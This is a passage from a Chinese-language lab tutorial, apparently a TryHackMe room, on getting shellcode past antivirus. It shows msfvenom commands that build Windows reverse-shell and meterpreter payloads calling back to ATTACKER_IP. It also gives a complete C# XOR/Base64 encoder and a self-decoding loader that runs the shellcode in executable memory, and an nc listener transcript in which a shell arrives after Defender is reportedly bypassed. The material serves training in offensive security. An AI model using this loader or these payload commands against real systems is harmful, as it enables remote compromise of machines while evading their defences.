d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>加密算法是否使用密钥来加密字符串或文件？ (yea/nay)</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yea</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="shellcode-encoding-and-encryption---shellcode-编码与加密">Shellcode Encoding and Encryption - Shellcode 编码与加密<a href="#shellcode-encoding-and-encryption---shellcode-编码与加密" class="hash-link" aria-label="Direct link to Shellcode Encoding and Encryption - Shellcode 编码与加密" title="Direct link to Shellcode Encoding and Encryption - Shellcode 编码与加密">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="使用-msfvenom-进行编码">使用 MSFVenom 进行编码<a href="#使用-msfvenom-进行编码" class="hash-link" aria-label="Direct link to 使用 MSFVenom 进行编码" title="Direct link to 使用 MSFVenom 进行编码">​</a></h3>
<p>诸如 Metasploit 之类的公开工具提供了编码和加密功能。然而，防病毒供应商已经了解这些工具构建其载荷的方式，并采取措施进行检测。如果你直接使用这些功能，你的载荷很可能会在文件触及受害者磁盘时被立即检测到。</p>
<p>让我们通过这种方法生成一个简单的载荷来证明这一点。首先，你可以使用以下命令列出 msfvenom 可用的所有编码器：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ msfvenom --list encoders | grep excellent</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>我们可以通过 <code>-e</code> 参数指定要使用的编码器，然后通过 <code>-i</code> 参数指定对载荷进行三次编码：
<code>shikata_ga_nai</code> <code>-e</code> <code>-i</code></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b &#x27;\x00&#x27; -i 3 -f csharp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Found 1 compatible encoders</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Attempting to encode payload with 3 iterations of x86/shikata_ga_nai</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">x86/shikata_ga_nai succeeded with size 368 (iteration=0)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">x86/shikata_ga_nai succeeded with size 395 (iteration=1)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">x86/shikata_ga_nai succeeded with size 422 (iteration=2)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">x86/shikata_ga_nai chosen with final size 422</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload size: 422 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Final size of csharp file: 2170 bytes</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>如果我们尝试将新生成的载荷上传到测试机器，防病毒软件会在我们有机会执行它之前立即标记它：</p>
<p><img decoding="async" loading="lazy" alt="Windows Defender detected our payload as malicious!" src="/assets/images/747c69e737c96044123329c47845f659-1741682064938-64-5947d44caf140525210186affe5f8a45.png" width="539" height="292" class="img_ev3q"></p>
<p>如果编码不起作用，我们还可以尝试加密载荷。直观上，我们会预期这种方法有更高的成功率，因为解密载荷对防病毒软件来说应该是一项更困难的任务。现在让我们来试试。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="使用-msfvenom-进行加密">使用 MSFVenom 进行加密<a href="#使用-msfvenom-进行加密" class="hash-link" aria-label="Direct link to 使用 MSFVenom 进行加密" title="Direct link to 使用 MSFVenom 进行加密">​</a></h3>
<p>你可以使用 msfvenom 轻松生成加密的载荷。然而，可用的加密算法选择相对有限。要列出可用的加密算法，可以使用以下命令：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ msfvenom --list encrypt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Framework Encryption Formats [--encrypt &lt;value&gt;]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">================================================</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Name</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ----</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    aes256</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    base64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    rc4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    xor</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>让我们构建一个 XOR 加密的载荷。对于这种类型的算法，你需要指定一个密钥。命令如下：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key &quot;MyZekr3tKey***&quot; -o xored-revshell.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[-] No arch selected, selecting arch: x64 from the payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">No encoder specified, outputting raw payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload size: 510 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Final size of exe file: 7168 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Saved as: xored-revshell.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>再次，如果我们将生成的 shell 上传到 THM 防病毒检查页面 <code>http://10.10.14.106/</code>，它仍然会被防病毒软件标记。原因仍然是防病毒供应商投入了大量时间来确保检测到简单的 msfvenom 载荷。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="创建自定义载荷">创建自定义载荷<a href="#创建自定义载荷" class="hash-link" aria-label="Direct link to 创建自定义载荷" title="Direct link to 创建自定义载荷">​</a></h3>
<p>克服这一问题的最佳方法是使用我们自己的自定义编码方案，这样防病毒软件就不知道如何分析我们的载荷。请注意，你不需要做任何太复杂的事情，只要它足够让防病毒软件难以分析即可。在本任务中，我们将使用 msfvenom 生成的简单反向 shell，并通过 XOR 和 Base64 的组合来绕过 Defender。</p>
<p>让我们首先使用 msfvenom 生成一个 CSharp 格式的反向 shell：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="编码器">编码器<a href="#编码器" class="hash-link" aria-label="Direct link to 编码器" title="Direct link to 编码器">​</a></h3>
<p>在构建实际载荷之前，我们将创建一个程序，用于对 msfvenom 生成的 shellcode 进行编码。在本例中，我们将首先使用自定义密钥对载荷进行 XOR 加密，然后使用 base64 对其进行编码。以下是编码器的完整代码（你也可以在 Windows 机器的 <code>C:\Tools\CS Files\Encryptor.cs</code> 中找到此代码）：</p>
<div class="language-c# codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c# codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">using System;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System.Collections.Generic;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System.Linq;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System.Text;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System.Threading.Tasks;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">namespace Encrypter</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    internal class Program</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        private static byte[] xor(byte[] shell, byte[] KeyBytes)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            for (int i = 0; i &lt; shell.Length; i++)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                shell[i] ^= KeyBytes[i % KeyBytes.Length];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return shell;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        static void Main(string[] args)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            //XOR Key - It has to be the same in the Droppr for Decrypting</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            string key = &quot;THMK3y123!&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            //Convert Key into bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            byte[] keyBytes = Encoding.ASCII.GetBytes(key);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            //Original Shellcode here (csharp format)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            byte[] buf = new byte[460] { 0xfc,0x48,0x83,..,0xda,0xff,0xd5 };</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            //XORing byte by byte and saving into a new array of bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            byte[] encoded = xor(buf, keyBytes);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Console.WriteLine(Convert.ToBase64String(encoded));        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>代码非常简单，它将生成一个编码后的载荷，我们将把它嵌入到最终的载荷中。记得将 <code>buf</code> 变量替换为你使用 msfvenom 生成的 shellcode。</p>
<p>要在 Windows 机器上编译并执行编码器，可以使用以下命令：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\&gt; csc.exe Encrypter.cs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\&gt; .\Encrypter.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="自解码载荷">自解码载荷<a href="#自解码载荷" class="hash-link" aria-label="Direct link to 自解码载荷" title="Direct link to 自解码载荷">​</a></h3>
<p>由于我们有一个编码后的载荷，我们需要调整代码，使其在执行之前对 shellcode 进行解码。为了与编码器匹配，我们将按照编码的相反顺序进行解码，因此我们首先解码 base64 内容，然后使用与编码器相同的密钥对结果进行 XOR 解密。以下是完整的载荷代码（你也可以在 Windows 机器的 <code>C:\Tools\CS Files\EncStageless.cs</code> 中找到它）：</p>
<div class="language-c# codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c# codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">using System;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System.Net;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System.Text;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System.Runtime.InteropServices;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Program {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [DllImport(&quot;kernel32&quot;)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [DllImport(&quot;kernel32&quot;)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [DllImport(&quot;kernel32&quot;)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  private static UInt32 MEM_COMMIT = 0x1000;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  private static byte[] xor(byte[] shell, byte[] KeyBytes)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            for (int i = 0; i &lt; shell.Length; i++)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                shell[i] ^= KeyBytes[i % KeyBytes.Length];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return shell;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  public static void Main()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    string dataBS64 = &quot;qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    byte[] data = Convert.FromBase64String(dataBS64);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    string key = &quot;THMK3y123!&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    //Convert Key into bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    byte[] keyBytes = Encoding.ASCII.GetBytes(key);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    byte[] encoded = xor(data, keyBytes);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    IntPtr threadHandle = IntPtr.Zero;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    UInt32 threadId = 0;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    IntPtr parameter = IntPtr.Zero;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    WaitForSingleObject(threadHandle, 0xFFFFFFFF);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>请注意，我们仅仅是将两个独立使用时被检测到的非常简单的技术进行了结合。尽管如此，这次杀毒软件不会对载荷提出警告，因为这两种方法的结合方式是它无法直接分析的。</p>
<p>现在，让我们在 Windows 机器上使用以下命令编译我们的载荷：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\&gt; csc.exe EncStageless.cs</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在运行我们的载荷之前，先使用<code>nc</code>设置一个监听器。在将载荷复制并执行到受害者机器后，我们应该如预期一样收到回连：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ nc -lvp 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Listening on [0.0.0.0] (family 0, port 443)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Connection from ip-10-10-139-83.eu-west-1.compute.internal 49817 received!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Microsoft Windows [Version 10.0.17763.1821]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(c) 2018 Microsoft Corporation. All rights reserved.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\Windows\System32&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>如你所见，有时简单的调整就足够了。大多数情况下，你在网上找到的任何特定方法可能无法直接奏效，因为可能已经存在相应的检测签名。然而，通过稍微发挥想象力，定制任何方法，可能足以成功绕过检测。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>尝试在 THM Antivirus Check 上使用这种技术（结合编码和加密）。它能绕过安装的 AV 软件吗？<code>http://10.10.14.106/</code></p></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="packers---打包工具">Packers - 打包工具<a href="#packers---打包工具" class="hash-link" aria-label="Direct link to Packers - 打包工具" title="Direct link to Packers - 打包工具">​</a></h2>
<p>另一种击败基于磁盘的 AV 检测的方法是使用打包工具。<strong>打包工具</strong>是将一个程序作为输入，并对其进行转换，使其结构看起来不同，但功能保持完全不变的软件。打包工具的两个主要目标是：</p>
<ul>
<li>压缩程序，以减少占用的空间。</li>
<li>保护程序免受逆向工程的侵害。</li>
